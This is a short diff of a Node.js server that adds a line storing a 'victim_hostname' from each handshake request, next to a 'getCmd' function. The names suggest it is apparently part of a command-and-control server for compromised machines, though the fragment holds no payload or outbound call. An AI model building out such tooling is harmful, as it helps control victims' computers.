@@ -6,6 +6,7 @@ const authMiddleware = require("../middleware/authMiddleware");
 function initialHandshake(req, res) {
 	const ipv4 = ip.address();
 	const currentDate = helper.getCurrentDate()
+	const victim_hostname = req.body['hostname'];
 }
 
 function getCmd(req, res) {
